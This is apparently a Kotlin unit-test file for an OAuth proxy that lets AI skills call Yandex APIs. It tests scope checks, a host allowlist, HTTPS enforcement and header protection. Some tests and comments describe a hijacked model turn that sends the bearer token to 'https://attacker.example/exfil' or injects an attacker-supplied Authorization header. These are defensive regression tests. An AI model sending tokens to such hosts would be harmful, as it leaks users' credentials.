package ru.souz.skilloauth.impl

import io.ktor.client.HttpClient
import io.ktor.client.engine.mock.MockEngine
import io.ktor.client.engine.mock.respond
import io.ktor.http.HttpHeaders
import io.ktor.http.headersOf
import java.time.Clock
import java.time.Instant
import java.time.ZoneOffset
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue
import kotlin.test.assertFailsWith
import kotlinx.coroutines.test.runTest
import ru.souz.skilloauth.ApiCallRequest
import ru.souz.skilloauth.SkillOAuthException

/**
 * Covers the parts of [SkillOAuthApiImpl] that do not require a live network call
 * (status/startAuthorization use no HTTP; `buildAuthorizeUrl` is a pure string builder).
 * Token-exchange/refresh paths (which call the real Yandex endpoints) are not covered
 * here — see the plan's noted gap around HTTP-mocked provider tests.
 */
class SkillOAuthApiImplTest {
    private val fixedClock = Clock.fixed(Instant.parse("2026-01-01T00:00:00Z"), ZoneOffset.UTC)
    private val testCryptoKey = java.util.Base64.getEncoder().encodeToString(ByteArray(32))
    private val testCrypto = SkillOAuthTokenCrypto(testCryptoKey)

    private fun newApi(
        credentialRepository: SkillOAuthCredentialRepository = InMemorySkillOAuthCredentialRepository(),
        pendingStateRepository: SkillOAuthPendingStateRepository = InMemorySkillOAuthPendingStateRepository(),
        httpClient: HttpClient = defaultSkillOAuthHttpClient(),
    ) = SkillOAuthApiImpl(
        credentialRepository = credentialRepository,
        pendingStateRepository = pendingStateRepository,
        crypto = SkillOAuthTokenCrypto(testCryptoKey),
        providers = mapOf(
            "yandex" to AuthorizationCodeOAuthClient(
                config = AuthorizationCodeOAuthConfig(
                    name = "yandex",
                    authorizeEndpoint = "https://oauth.yandex.ru/authorize",
                    tokenEndpoint = "https://oauth.yandex.ru/token",
                    clientId = "client-1",
                    clientSecret = "secret-1",
                    redirectUri = "https://backend.example/oauth/callback",
                    allowedApiHosts = setOf("login.yandex.ru"),
                ),
            )
        ),
        httpClient = httpClient,
        clock = fixedClock,
    )

    private suspend fun connectedCredentialRepository(
        grantedScopes: List<String> = listOf("login:info"),
    ): SkillOAuthCredentialRepository {
        val repository = InMemorySkillOAuthCredentialRepository()
        repository.upsert(
            SkillOAuthCredential(
                userId = "user-1",
                provider = "yandex",
                accessTokenEncrypted = testCrypto.encrypt("real-access-token"),
                refreshTokenEncrypted = null,
                grantedScopes = grantedScopes,
                expiresAt = null,
                createdAt = Instant.now(),
                updatedAt = Instant.now(),
            )
        )
        return repository
    }

    @Test
    fun `status reports not connected when no credential is stored`() = runTest {
        val api = newApi()

        val status = api.status(userId = "user-1", provider = "yandex")

        assertFalse(status.connected)
        assertTrue(status.grantedScopes.isEmpty())
    }

    @Test
    fun `status reports connected with granted scopes once a credential exists`() = runTest {
        val api = newApi(credentialRepository = connectedCredentialRepository(listOf("login:info")))

        val status = api.status(userId = "user-1", provider = "yandex")

        assertTrue(status.connected)
        assertEquals(listOf("login:info"), status.grantedScopes)
    }

    @Test
    fun `status reports not connected when granted scopes do not cover requiredScopes`() = runTest {
        // Regression test for a shared (userId, provider) credential accumulating scopes for one
        // skill that another, more narrowly-declared skill must not silently ride on.
        val api = newApi(credentialRepository = connectedCredentialRepository(listOf("login:info")))

        val status = api.status(userId = "user-1", provider = "yandex", requiredScopes = listOf("login:info", "iot:control"))

        assertFalse(status.connected)
        assertEquals(listOf("login:info"), status.grantedScopes)
        assertEquals(listOf("iot:control"), status.missingScopes)
    }

    @Test
    fun `status reports connected when requiredScopes are a subset of grantedScopes`() = runTest {
        val api = newApi(credentialRepository = connectedCredentialRepository(listOf("login:info", "iot:control", "iot:view")))

        val status = api.status(userId = "user-1", provider = "yandex", requiredScopes = listOf("iot:view"))

        assertTrue(status.connected)
        assertTrue(status.missingScopes.isEmpty())
    }

    @Test
    fun `startAuthorization stores a pending state and returns an authorize URL`() = runTest {
        val pendingStateRepository = InMemorySkillOAuthPendingStateRepository()
        val api = newApi(pendingStateRepository = pendingStateRepository)

        val result = api.startAuthorization(
            userId = "user-1",
            provider = "yandex",
            skillId = "skill-1",
            scopes = listOf("login:info"),
        )

        assertTrue(result.url.startsWith("https://oauth.yandex.ru/authorize?"))
        assertTrue(result.url.contains("client_id=client-1"))
        assertTrue(result.url.contains("scope=login%3Ainfo"))
    }

    @Test
    fun `startAuthorization supersedes an existing pending state for the same user and provider`() = runTest {
        // Regression test: without superseding, two overlapping ConnectOAuthProvider calls for the
        // same (userId, provider) would leave two live `state` tokens; whichever callback landed
        // last would upsert only its own requestedScopes, silently dropping what the first flow's
        // completed authorization just granted.
        val pendingStateRepository = InMemorySkillOAuthPendingStateRepository()
        val api = newApi(pendingStateRepository = pendingStateRepository)

        val first = api.startAuthorization(
            userId = "user-1",
            provider = "yandex",
            skillId = "skill-1",
            scopes = listOf("login:info"),
        )
        val second = api.startAuthorization(
            userId = "user-1",
            provider = "yandex",
            skillId = "skill-2",
            scopes = listOf("iot:control"),
        )

        val firstState = first.url.substringAfter("state=").substringBefore("&")
        assertTrue(pendingStateRepository.consume(firstState, fixedClock.instant()) == null)
        val secondScopeParam = second.url.substringAfter("scope=").substringBefore("&")
        assertEquals("login:info iot:control", java.net.URLDecoder.decode(secondScopeParam, "UTF-8"))
    }

    @Test
    fun `callAuthorizedApi rejects a skill that is not connected yet`() = runTest {
        val api = newApi()

        assertFailsWith<SkillOAuthException> {
            api.callAuthorizedApi(
                userId = "user-1",
                provider = "yandex",
                skillId = "skill-1",
                requiredScopes = emptyList(),
                request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
            )
        }
    }

    @Test
    fun `callAuthorizedApi rejects a connected skill whose requiredScopes exceed grantedScopes`() = runTest {
        val api = newApi(credentialRepository = connectedCredentialRepository(listOf("login:info")))

        assertFailsWith<SkillOAuthException> {
            api.callAuthorizedApi(
                userId = "user-1",
                provider = "yandex",
                skillId = "skill-1",
                requiredScopes = listOf("login:info", "iot:control"),
                request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
            )
        }
    }

    @Test
    fun `callAuthorizedApi rejects a URL host outside the provider's allowlist`() = runTest {
        // Regression test: without this check, a hijacked model turn could redirect the real
        // bearer token to an attacker-controlled or internal host via the model-supplied `url`.
        val api = newApi(credentialRepository = connectedCredentialRepository(listOf("login:info")))

        assertFailsWith<SkillOAuthException> {
            api.callAuthorizedApi(
                userId = "user-1",
                provider = "yandex",
                skillId = "skill-1",
                requiredScopes = listOf("login:info"),
                request = ApiCallRequest(method = "GET", url = "https://attacker.example/exfil"),
            )
        }
    }

    @Test
    fun `callAuthorizedApi rejects a non-HTTPS URL even on an allowed host`() = runTest {
        val api = newApi(credentialRepository = connectedCredentialRepository(listOf("login:info")))

        assertFailsWith<SkillOAuthException> {
            api.callAuthorizedApi(
                userId = "user-1",
                provider = "yandex",
                skillId = "skill-1",
                requiredScopes = listOf("login:info"),
                request = ApiCallRequest(method = "GET", url = "http://login.yandex.ru/info"),
            )
        }
    }

    @Test
    fun `callAuthorizedApi forwards caller headers and response headers`() = runTest {
        var capturedHeaders: io.ktor.http.Headers? = null
        val mockEngine = MockEngine { request ->
            capturedHeaders = request.headers
            respond(
                content = "{}",
                status = io.ktor.http.HttpStatusCode.OK,
                headers = headersOf("X-Provider-Header", listOf("provider-value")),
            )
        }
        val api = newApi(
            credentialRepository = connectedCredentialRepository(listOf("login:info")),
            httpClient = HttpClient(mockEngine),
        )

        val response = api.callAuthorizedApi(
            userId = "user-1",
            provider = "yandex",
            skillId = "skill-1",
            requiredScopes = listOf("login:info"),
            request = ApiCallRequest(
                method = "GET",
                url = "https://login.yandex.ru/info",
                headers = mapOf("X-Custom" to "custom-value"),
            ),
        )

        assertEquals("custom-value", capturedHeaders?.get("X-Custom"))
        assertEquals("provider-value", response.headers["X-Provider-Header"])
    }

    @Test
    fun `callAuthorizedApi never lets a caller-supplied Authorization header override the real access token`() = runTest {
        // Regression test: `headers` on ApiCallRequest is a model-supplied field; without this
        // protection a hijacked model turn could smuggle its own `Authorization` value and either
        // clobber the real bearer token in transit or (depending on server behavior) have both
        // sent, defeating the whole point of injecting the token server-side.
        var capturedAuthorization: String? = null
        val mockEngine = MockEngine { request ->
            capturedAuthorization = request.headers[HttpHeaders.Authorization]
            respond(content = "{}", status = io.ktor.http.HttpStatusCode.OK)
        }
        val api = newApi(
            credentialRepository = connectedCredentialRepository(listOf("login:info")),
            httpClient = HttpClient(mockEngine),
        )

        api.callAuthorizedApi(
            userId = "user-1",
            provider = "yandex",
            skillId = "skill-1",
            requiredScopes = listOf("login:info"),
            request = ApiCallRequest(
                method = "GET",
                url = "https://login.yandex.ru/info",
                headers = mapOf("Authorization" to "Bearer attacker-supplied-token"),
            ),
        )

        assertEquals("Bearer real-access-token", capturedAuthorization)
    }

    @Test
    fun `unsupported providers are rejected across all entry points`() = runTest {
        val api = newApi()

        assertFailsWith<SkillOAuthException> { api.status("user-1", "github") }
        assertFailsWith<SkillOAuthException> {
            api.startAuthorization("user-1", "github", "skill-1", emptyList())
        }
        assertFailsWith<SkillOAuthException> {
            api.callAuthorizedApi("user-1", "github", "skill-1", emptyList(), ApiCallRequest("GET", "https://example.com"))
        }
    }
}
